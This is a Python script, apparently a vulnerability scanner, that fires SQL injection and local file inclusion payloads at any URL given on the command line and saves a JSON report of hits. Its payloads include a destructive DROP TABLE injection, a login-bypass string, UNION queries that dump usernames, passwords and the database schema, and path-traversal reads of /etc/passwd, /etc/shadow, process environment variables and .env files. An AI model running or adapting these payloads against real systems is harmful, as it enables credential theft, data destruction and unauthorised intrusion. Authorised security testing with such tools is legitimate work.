import requests
import json
import time
import sys
from urllib.parse import urljoin
from colorama import Fore, Back, Style, init

init(autoreset=True)

class APIScanner:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def print_banner(self):
        print(f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                    API VULNERABILITY SCANNER                 ║
║                     SQL Injection & LFI                     ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
Target: {Fore.YELLOW}{self.base_url}{Style.RESET_ALL}
""")
    
    def test_endpoint(self, endpoint, method='GET', data=None, params=None):
        """Test individual endpoint"""
        url = urljoin(self.base_url, endpoint)
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=10)
            elif method.upper() == 'POST':
                response = self.session.post(url, json=data, timeout=10)
            
            return response
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {endpoint}: {e}{Style.RESET_ALL}")
            return None
    
    def check_sqli_error_based(self):
        """Check for error-based SQL injection"""
        print(f"\n{Fore.BLUE}[*] Testing Error-based SQL Injection...{Style.RESET_ALL}")
        
        sqli_payloads = [
            "'",
            '"',
            "1'",
            "1\"",
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
            "1'; DROP TABLE users;--",
            "1' UNION SELECT NULL--",
            "1' AND 1=CONVERT(int, (SELECT @@version))--"
        ]
        
        endpoints = [
            '/api/v1/users',
            '/api/v1/search'
        ]
        
        for endpoint in endpoints:
            for payload in sqli_payloads:
                params = {'id': payload, 'q': payload}
                response = self.test_endpoint(endpoint, params=params)
                
                if response and response.status_code == 500:
                    error_indicators = [
                        'sqlite3.OperationalError',
                        'SQL syntax',
                        'database',
                        'SELECT',
                        'WHERE'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        vuln = {
                            'type': 'SQL Injection (Error-based)',
                            'endpoint': endpoint,
                            'payload': payload,
                            'method': 'GET',
                            'response_code': response.status_code,
                            'evidence': response.text[:200]
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] VULN FOUND: {endpoint} - Payload: {payload}{Style.RESET_ALL}")
                        break
        
        time.sleep(0.5)  # Rate limiting
    
    def check_sqli_boolean_based(self):
        """Check for boolean-based SQL injection"""
        print(f"\n{Fore.BLUE}[*] Testing Boolean-based SQL Injection...{Style.RESET_ALL}")
        
        # Test login endpoint
        true_payload = {"username": "admin' OR '1'='1'--", "password": "anything"}
        false_payload = {"username": "admin' OR '1'='2'--", "password": "anything"}
        
        response_true = self.test_endpoint('/api/v1/login', 'POST', true_payload)
        response_false = self.test_endpoint('/api/v1/login', 'POST', false_payload)
        
        if response_true and response_false:
            if response_true.status_code != response_false.status_code:
                vuln = {
                    'type': 'SQL Injection (Boolean-based)',
                    'endpoint': '/api/v1/login',
                    'payload': str(true_payload),
                    'method': 'POST',
                    'evidence': f"True: {response_true.status_code}, False: {response_false.status_code}"
                }
                self.vulnerabilities.append(vuln)
                print(f"{Fore.RED}[!] VULN FOUND: Boolean-based SQLi in login{Style.RESET_ALL}")
    
    def check_sqli_union_based(self):
        """Check for UNION-based SQL injection"""
        print(f"\n{Fore.BLUE}[*] Testing UNION-based SQL Injection...{Style.RESET_ALL}")
        
        union_payloads = [
            "test' UNION SELECT 1,2,3,4,5--",
            "test' UNION SELECT null,username,password,null,null FROM users--",
            "test' UNION SELECT 1,sqlite_version(),3,4,5--",
            "test' UNION SELECT 1,name,sql,4,5 FROM sqlite_master--"
        ]
        
        for payload in union_payloads:
            response = self.test_endpoint('/api/v1/search', params={'q': payload})
            
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if 'data' in data and len(data['data']) > 0:
                        # Check if we got unexpected data structure
                        first_item = data['data'][0]
                        if any(str(val).isdigit() and int(val) in [1,2,3,4,5] for val in first_item.values()):
                            vuln = {
                                'type': 'SQL Injection (UNION-based)',
                                'endpoint': '/api/v1/search',
                                'payload': payload,
                                'method': 'GET',
                                'evidence': str(data['data'][:2])
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"{Fore.RED}[!] VULN FOUND: UNION-based SQLi - {payload[:50]}...{Style.RESET_ALL}")
                            break
                except:
                    pass
    
    def check_lfi(self):
        """Check for Local File Inclusion"""
        print(f"\n{Fore.BLUE}[*] Testing Local File Inclusion...{Style.RESET_ALL}")
        
        lfi_payloads = [
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/version',
            '/proc/self/environ',
            '../app.py',
            '../../app.py',
            '../../../app.py'
        ]
        
        lfi_endpoints = [
            '/api/v1/docs',
            '/api/v1/logs',
            '/api/v1/download'
        ]
        
        for endpoint in lfi_endpoints:
            for payload in lfi_payloads:
                if endpoint == '/api/v1/docs':
                    params = {'file': payload}
                elif endpoint == '/api/v1/logs':
                    params = {'logfile': payload, 'type': 'system'}
                else:
                    params = {'path': payload}
                
                response = self.test_endpoint(endpoint, params=params)
                
                if response and response.status_code == 200:
                    lfi_indicators = [
                        'root:x:0:0:',
                        '/bin/bash',
                        '/bin/sh',
                        'daemon:',
                        'sys:',
                        'def ',
                        'import ',
                        'from flask'
                    ]
                    
                    if any(indicator in response.text for indicator in lfi_indicators):
                        vuln = {
                            'type': 'Local File Inclusion',
                            'endpoint': endpoint,
                            'payload': payload,
                            'method': 'GET',
                            'evidence': response.text[:200]
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] VULN FOUND: LFI in {endpoint} - {payload}{Style.RESET_ALL}")
                        break
    
    def check_information_disclosure(self):
        """Check for information disclosure"""
        print(f"\n{Fore.BLUE}[*] Testing Information Disclosure...{Style.RESET_ALL}")
        
        sensitive_endpoints = [
            '/api/v1/debug',
            '/api/v1/config',
            '/.env',
            '/config.json',
            '/app.py',
            '/database.py'
        ]
        
        for endpoint in sensitive_endpoints:
            response = self.test_endpoint(endpoint)
            
            if response and response.status_code == 200:
                sensitive_keywords = [
                    'password',
                    'secret',
                    'key',
                    'token',
                    'database',
                    'config',
                    'admin'
                ]
                
                if any(keyword in response.text.lower() for keyword in sensitive_keywords):
                    vuln = {
                        'type': 'Information Disclosure',
                        'endpoint': endpoint,
                        'method': 'GET',
                        'evidence': response.text[:300]
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!] VULN FOUND: Information Disclosure - {endpoint}{Style.RESET_ALL}")
    
    def generate_report(self):
        """Generate vulnerability report"""
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"VULNERABILITY SCAN REPORT")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}[+] No vulnerabilities found!{Style.RESET_ALL}")
            return
        
        print(f"{Fore.RED}[!] Found {len(self.vulnerabilities)} vulnerabilities:{Style.RESET_ALL}\n")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"{Fore.YELLOW}[{i}] {vuln['type']}{Style.RESET_ALL}")
            print(f"    Endpoint: {vuln['endpoint']}")
            print(f"    Method: {vuln.get('method', 'GET')}")
            if 'payload' in vuln:
                print(f"    Payload: {vuln['payload']}")
            print(f"    Evidence: {vuln['evidence'][:100]}...")
            print()
        
        # Save to file
        with open('vulnerability_report.json', 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Report saved to vulnerability_report.json{Style.RESET_ALL}")
    
    def run_scan(self):
        """Run complete vulnerability scan"""
        self.print_banner()
        
        # Test if target is reachable
        try:
            response = self.session.get(self.base_url, timeout=10)
            print(f"{Fore.GREEN}[+] Target is reachable (Status: {response.status_code}){Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[-] Target is not reachable!{Style.RESET_ALL}")
            return
        
        # Run vulnerability tests
        self.check_sqli_error_based()
        self.check_sqli_boolean_based()
        self.check_sqli_union_based()
        self.check_lfi()
        self.check_information_disclosure()
        
        # Generate report
        self.generate_report()

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
    
    target_url = sys.argv[1]
    scanner = APIScanner(target_url)
    scanner.run_scan()

if __name__ == '__main__':
    main()
